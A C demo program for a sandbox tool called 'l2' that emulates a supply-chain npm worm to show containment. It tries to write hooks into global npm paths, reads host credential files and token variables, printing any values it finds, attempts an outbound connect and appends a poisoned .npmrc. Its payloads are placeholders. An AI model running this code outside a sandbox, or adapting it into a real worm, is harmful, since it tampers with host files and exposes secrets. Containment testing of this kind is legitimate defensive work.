/*
 * l2_miasma_resistance_demo.c
 *
 * A canonical demonstration of supply-chain / "Miasma"-class worm containment
 * inside the l2 system substrate under the "ransom-hardened" (full safety) and
 * strict-mcp policies.
 *
 * Purpose:
 *   This program is the "perfect display" of a modern supply-chain credential-
 *   stealing worm (inspired by the real 2026 Miasma attack on Red Hat npm
 *   packages, itself derived from Mini Shai-Hulud).
 *
 *   It deliberately emulates key Miasma / supply-chain worm behaviors on Linux:
 *     - Preinstall / postinstall hook simulation (tamper with package.json, node_modules hooks)
 *     - Credential harvesting (env tokens: GITHUB_TOKEN, OIDC, AWS_*, GH_*, cloud creds;
 *       read host files like ~/.git-credentials, ~/.config/gh/hosts.yml, /proc)
 *     - OIDC / "trusted publishing" token exchange simulation (http to GitHub endpoints)
 *     - Tarball repackaging + "signing" (create fake updated.tgz, simulate Sigstore)
 *     - Exfiltration to attacker "GitHub" repos carrying "Miasma: The Spreading Blight"
 *     - Self-propagation / worm spread (attempt to "publish" or infect other package locations)
 *     - Persistence for supply chain (write .npmrc hooks, global package scripts, /etc profile hooks)
 *     - Anti-analysis / priv (ptrace, personality, setuid attempts)
 *
 *   Recommended (use L2_DATA_DIR for clean isolated testing; `l2 exec` under
 *   strict/ransom-hardened policies auto-escalates via sudo for namespaces, and
 *   L2_DATA_DIR (plus other L2_* vars) is now properly passed through):
 *        export L2_DATA_DIR=$(mktemp -d)
 *        l2 create miasma-test --policy ransom-hardened
 *        l2 put miasma-test miasma-sim.c --file docs/examples/l2_miasma_resistance_demo.c
 *        l2 exec miasma-test 'gcc -static -Wall -Wextra -o miasma-sim miasma-sim.c && ./miasma-sim'
 *        l2 audit --test   # exercises the Miasma supply-chain check
 *        l2 destroy miasma-test
 *
 *   ...only files inside the l2-provided workspace can be affected ("poisoned").
 *   All network exfil, host file tampering, credential access, and spread attempts
 *   are blocked by the substrate (Landlock ws-only writes + minimal RO; auto
 *   seccomp KILL on net/socket/connect + NEVER list; caps drop; no_new_privs;
 *   non-dumpable; env_clear() stripping all host tokens/SSH/npm auth; namespaces;
 *   rlimits).
 *
 *   On a normal unprotected Linux host (or loose container) this would:
 *   - Steal your GitHub/cloud OIDC tokens during "npm ci"
 *   - Repackage and "publish" a malicious version of the package via Sigstore bypasses
 *   - Exfil creds to attacker GitHub repos (hunting signal: "Miasma: The Spreading Blight")
 *   - Spread the worm to other packages in the org / transitive deps
 *   - Leave persistent hooks in ~/.npm , global node_modules, etc.
 *
 * Compile / run inside l2 (recommended for testing containment):
 *   (see usage above with `L2_DATA_DIR`; -static minimizes required RO paths under strict Landlock.
 *    See the dedicated Troubleshooting subsection in README.md for L2_DATA_DIR + sudo notes, old kernels, etc.)
 *
 * Compile standalone (for education / "what it does on host"):
 *   gcc -Wall -Wextra -o miasma-sim l2_miasma_resistance_demo.c
 *
 * This file is self-contained (standard C99 + POSIX + a few Linux headers). No external libs.
 * "Exfil" and "repackage" are simulated (no real network damage, no real crypto/signing).
 * It never actually publishes or deletes real data.
 *
 * Cross-references:
 *   - See docs/examples/l2_ransomware_resistance_demo.c (WannaCry-class sibling)
 *   - See docs/examples/l2_malware_cancer_resistance_demo.c (AIO "malware-cancer" attack on l2 substrate under great-harden + grand demonstration of l2 North-Star Containment; full substrate defense validation)
 *   - See docs/examples/l2_safe_execution_demo.c (the "good" contrast)
 *   - docs/SECURITY.md (supply chain section + great-harden AIO), docs/ROADMAP.md, the ransom-hardened / great-harden policy
 *   - l2 harden --profile ransom-hardened (or strict-mcp) + l2 audit --test ; l2 great-harden --apply for supreme
 *
 * This extends l2's "prepare for real malicious workload testing" story to
 * supply-chain worms like Miasma: the policy + this demo + harden artifacts +
 * `l2 audit --test` give a repeatable, auditable, standards-backed validation
 * that credential-stealing / worm-spreading supply-chain code is contained to
 * the narrow authority the terminal operator granted via `l2 put` + `l2 exec`.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <dirent.h>
#include <limits.h>
#include <time.h>

static void print_header(const char *title) {
    printf("\n=== %s ===\n", title);
}

static int is_in_l2_workspace(void) {
    char cwd[PATH_MAX];
    if (getcwd(cwd, sizeof(cwd)) == NULL) return 0;
    /* l2 workspaces are /tmp/l2-ws-<id> or under L2_DATA_DIR */
    if (strstr(cwd, "/l2-ws-") || strstr(cwd, "l2-ws-")) return 1;
    if (strstr(cwd, "/tmp/l2-") || strstr(cwd, "l2-miasma") || strstr(cwd, "l2-ransom")) return 1;
    return 0;
}

static void demonstrate_npm_preinstall_and_tampering(void) {
    print_header("npm preinstall / package tampering (Miasma-style hook + global infection)");

    const char *evil_hook = "#!/bin/sh\necho 'MIASMA PREINSTALL HOOK FIRED - would steal tokens and repackage'\n";
    const char *evil_tar = "fake-malicious-update-1.2.3.tgz"; /* simulated repackaged tarball */

    const char *targets[] = {
        "/usr/local/lib/node_modules/@redhat-cloud-services/foo/postinstall.js",
        "/root/.npm/_hooks/preinstall",
        "/home/user/.npmrc",  /* would contain always-auth + token */
        "/tmp/node_modules/.package-lock.json", /* common in builds */
        NULL
    };

    for (int i = 0; targets[i]; i++) {
        printf("  Attempt to write malicious hook/tarball to %s ... ", targets[i]);
        int fd = open(targets[i], O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (fd < 0) {
            printf("BLOCKED (%s)\n", strerror(errno));
        } else {
            write(fd, evil_hook, strlen(evil_hook));
            close(fd);
            /* also drop the "repackaged" tarball next to it */
            char tpath[512];
            snprintf(tpath, sizeof(tpath), "%s/%s", targets[i], evil_tar);
            int tfd = open(tpath, O_WRONLY | O_CREAT, 0644);
            if (tfd >= 0) { write(tfd, "MIASMA_REPACKAGED_PAYLOAD", 25); close(tfd); }
            if (strstr(targets[i], "/l2-ws-") || strstr(targets[i], getcwd(NULL, 0))) {
                printf("wrote inside ws (authorized test data only)\n");
            } else {
                printf("UNEXPECTED SUCCESS (would have poisoned host package / npm cache)\n");
            }
        }
    }

    /* Always do safe contained version inside ws */
    if (is_in_l2_workspace()) {
        printf("  (Inside workspace: creating safe 'infected' test package artifacts)\n");
        int fd = open("malicious-preinstall-hook.js", O_WRONLY | O_CREAT, 0644);
        if (fd >= 0) {
            write(fd, "console.log('MIASMA would run here but only on authorized ws data');\n", 70);
            close(fd);
            int tfd = open("updated-miasma-pkg.tgz", O_WRONLY | O_CREAT, 0644);
            if (tfd >= 0) { write(tfd, "SAFE_REPACKAGED_ONLY_IN_WS", 26); close(tfd); }
            printf("  Safely dropped 'worm' artifacts inside ws only.\n");
        }
    }
}

static void demonstrate_credential_harvest(void) {
    print_header("Credential & OIDC token harvest (env, files, /proc - Miasma core payload)");

    const char *token_names[] = {
        "GITHUB_TOKEN", "GH_TOKEN", "GITHUB_OIDC_TOKEN", "ACTIONS_ID_TOKEN_REQUEST_TOKEN",
        "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "GOOGLE_APPLICATION_CREDENTIALS",
        "AZURE_CLIENT_ID", "AZURE_CLIENT_SECRET", "SIGSTORE_IDENTITY_TOKEN",
        "NPM_TOKEN", "NODE_AUTH_TOKEN", NULL
    };

    printf("  Scanning environment for cloud / GitHub / npm tokens ...\n");
    int found = 0;
    for (int i = 0; token_names[i]; i++) {
        char *val = getenv(token_names[i]);
        if (val && strlen(val) > 4) {
            printf("  !! UNEXPECTED: found %s=%s... (would be exfiltrated)\n", token_names[i], val);
            found = 1;
        } else {
            printf("  %s: not present or empty (good - env cleared by l2)\n", token_names[i]);
        }
    }

    /* Try reading common credential files that would be on host */
    const char *cred_files[] = {
        "/root/.git-credentials",
        "/root/.config/gh/hosts.yml",
        "/home/user/.aws/credentials",
        "/root/.npm/_auth",
        "/proc/self/environ",  /* would contain original env before clear */
        NULL
    };

    for (int i = 0; cred_files[i]; i++) {
        printf("  Attempt to read host credential file %s ... ", cred_files[i]);
        int fd = open(cred_files[i], O_RDONLY);
        if (fd < 0) {
            printf("BLOCKED (%s)\n", strerror(errno));
        } else {
            char buf[128] = {0};
            ssize_t n = read(fd, buf, sizeof(buf)-1);
            close(fd);
            if (n > 0) {
                printf("UNEXPECTED SUCCESS (read %zd bytes of creds)\n", n);
                found = 1;
            } else {
                printf("readable but empty?\n");
            }
        }
    }

    if (!found && !is_in_l2_workspace()) {
        printf("  (On host this would have harvested real tokens.)\n");
    }
}

static void demonstrate_oidc_and_exfil(void) {
    print_header("OIDC token exchange + GitHub exfil (Miasma: The Spreading Blight)");

    /* Simulate calling GitHub OIDC / whoami / token endpoints */
    const char *endpoints[] = {
        "api.github.com:443",   /* for whoami + token exchange */
        "github.com:443",       /* for login/oauth */
        NULL
    };

    for (int i = 0; endpoints[i]; i++) {
        printf("  Attempt TCP connect for OIDC/token exfil to %s ... ", endpoints[i]);
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            printf("BLOCKED early (socket: %s)\n", strerror(errno));
            continue;
        }
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(443);
        /* Use a non-routable IP for simulation; real would resolve api.github.com */
        inet_pton(AF_INET, "192.0.2.1", &addr.sin_addr);  /* TEST-NET-1, will fail connect */
        if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            printf("BLOCKED (connect: %s) - no exfil possible\n", strerror(errno));
        } else {
            printf("UNEXPECTED SUCCESS (would have POSTed stolen OIDC + 'Miasma: The Spreading Blight')\n");
            /* In real worm: send the token + repackaged tarball metadata */
            char payload[256];
            snprintf(payload, sizeof(payload), "Miasma exfil: stolen_token=... repo_desc=Miasma: The Spreading Blight");
            send(s, payload, strlen(payload), 0);
        }
        close(s);
    }

    /* Simulate creating the attacker repo marker */
    printf("  Attempt to 'create' attacker GitHub repo marker (simulated file write with blight desc) ... ");
    int fd = open("/tmp/miasma-blight-repo.txt", O_WRONLY | O_CREAT, 0644);
    if (fd < 0) {
        printf("BLOCKED (%s)\n", strerror(errno));
    } else {
        const char *blight = "Miasma: The Spreading Blight\nstolen_creds_exfil\n";
        write(fd, blight, strlen(blight));
        close(fd);
        if (is_in_l2_workspace()) {
            printf("only inside ws (test artifact)\n");
        } else {
            printf("UNEXPECTED: blight marker written to host\n");
        }
    }
}

static void demonstrate_repackage_and_worm_spread(void) {
    print_header("Tarball repack + self-propagating worm (Sigstore bypass + publish)");

    /* Simulate taking a legitimate package tarball and repackaging it maliciously */
    const char *legit = "legit-pkg-1.0.0.tgz";
    const char *evil = "updated-pkg-1.0.1.tgz";  /* the Miasma-updated one */

    printf("  Simulate repackaging %s into malicious %s ... ", legit, evil);
    /* In ws we can do it; outside we shouldn't be able to read the original or write global */
    int rfd = open(legit, O_RDONLY);
    if (rfd < 0) {
        /* try a host location that would exist in a real npm install */
        rfd = open("/usr/local/lib/node_modules/redhat-pkg/package.tgz", O_RDONLY);
    }
    if (rfd < 0) {
        printf("BLOCKED (could not read original tarball for repack: %s)\n", strerror(errno));
    } else {
        char buf[128];
        read(rfd, buf, sizeof(buf));
        close(rfd);

        int wfd = open(evil, O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (wfd < 0) {
            printf("BLOCKED write of evil tarball (%s)\n", strerror(errno));
        } else {
            write(wfd, "MIASMA_REPACKAGED_WITH_STOLEN_CREDS", 35);
            /* also "sign" it */
            write(wfd, "\nSigstore: fake-signature-for-Miasma", 34);
            close(wfd);
            printf("UNEXPECTED SUCCESS (repackaged + 'signed' the worm tarball)\n");
        }
    }

    /* Propagation: try to drop the evil tarball into common global npm cache locations */
    const char *prop_targets[] = {
        "/root/.npm/_cacache/content-v2/sha512/miasma-payload",
        "/usr/local/lib/node_modules/@redhat-cloud-services/miasma-pkg",
        NULL
    };
    for (int i = 0; prop_targets[i]; i++) {
        printf("  Attempt worm propagation write to %s ... ", prop_targets[i]);
        int fd = open(prop_targets[i], O_WRONLY | O_CREAT, 0644);
        if (fd < 0) {
            printf("BLOCKED (%s)\n", strerror(errno));
        } else {
            write(fd, "MIASMA_WORM_PAYLOAD", 19);
            close(fd);
            printf("UNEXPECTED SUCCESS (would spread to other packages)\n");
        }
    }
}

static void demonstrate_persistence_and_hooks(void) {
    print_header("Supply-chain persistence (npm hooks, .npmrc, global postinstall)");

    const char *evil_npmrc = "always-auth=true\n//registry.npmjs.org/:_authToken=MIASMA_STOLEN\n";
    const char *targets[] = {
        "/root/.npmrc",
        "/home/user/.npmrc",
        "/etc/npmrc",
        "/root/.config/npm/npmrc",  /* for hooks */
        NULL
    };

    for (int i = 0; targets[i]; i++) {
        printf("  Write Miasma npm hook/persist to %s ... ", targets[i]);
        int fd = open(targets[i], O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (fd < 0) {
            printf("BLOCKED (%s)\n", strerror(errno));
        } else {
            write(fd, evil_npmrc, strlen(evil_npmrc));
            close(fd);
            if (strstr(targets[i], "/l2-ws-") || strstr(targets[i], getcwd(NULL,0))) {
                printf("inside ws (test)\n");
            } else {
                printf("UNEXPECTED SUCCESS (would hook all future npm on host)\n");
            }
        }
    }
}

static void demonstrate_priv_esc_and_anti_miasma(void) {
    print_header("Priv esc + anti-analysis (same as ransomware demo - relevant for worm)");

    printf("  Attempt setuid(0) ... ");
    if (setuid(0) == 0) {
        printf("UNEXPECTED: root!\n");
    } else {
        printf("BLOCKED (uid=%d)\n", getuid());
    }

    printf("  Attempt ptrace self ... ");
    if (ptrace(PTRACE_TRACEME, 0, 0, 0) == 0) {
        printf("succeeded\n");
    } else {
        printf("BLOCKED\n");
    }

    printf("  (personality, module loads, kexec would be KILLed by seccomp under ransom-hardened)\n");
}

int main(void) {
    printf("l2 Miasma Resistance Demonstration (Supply-Chain Worm / Credential-Stealing)\n");
    printf("==========================================================================\n\n");
    printf("Run inside an l2 system created with --policy ransom-hardened (or strict-mcp).\n");
    printf("This emulates the 2026 Miasma attack (Red Hat npm worm) to prove containment.\n\n");

    demonstrate_npm_preinstall_and_tampering();
    demonstrate_credential_harvest();
    demonstrate_oidc_and_exfil();
    demonstrate_repackage_and_worm_spread();
    demonstrate_persistence_and_hooks();
    demonstrate_priv_esc_and_anti_miasma();

    printf("\n=== Conclusion ===\n");
    printf("Under l2 --policy ransom-hardened the only 'infections' this program could\n");
    printf("perform are inside the explicit workspace created by `l2 put`.\n");
    printf("All credential theft, OIDC exfil, tarball repack+publish, GitHub 'Miasma: The Spreading Blight'\n");
    printf("markers, npm hook persistence, and package tampering outside the ws were blocked.\n\n");

    printf("Controls active (ransom-hardened full safety + strict-mcp for agents):\n");
    printf("  - Landlock: workspace-only writes (no tampering global node_modules, ~/.npm, /usr/local)\n");
    printf("  - Seccomp Phase 1 ENFORCING (auto): KILL on socket/connect/sendto + full NEVER list (net, ptrace, modules)\n");
    printf("  - Env sanitization (env_clear + minimal PATH/HOME/USER - no GITHUB_TOKEN, OIDC, AWS_* etc. leaked to worm)\n");
    printf("  - Capability drop + no_new_privs + non-dumpable + namespaces + rlimits\n");
    printf("  - Explicit terminal authority: only packages you `l2 put` can run under the policy\n\n");

    printf("This is what containment looks like for Miasma-class supply chain worms.\n");
    printf("When ready, replace this sim with a real npm worm or equivalent and re-test.\n");
    printf("Pair with: l2 harden --profile ransom-hardened ; l2 audit --test\n");

    return 0;
}
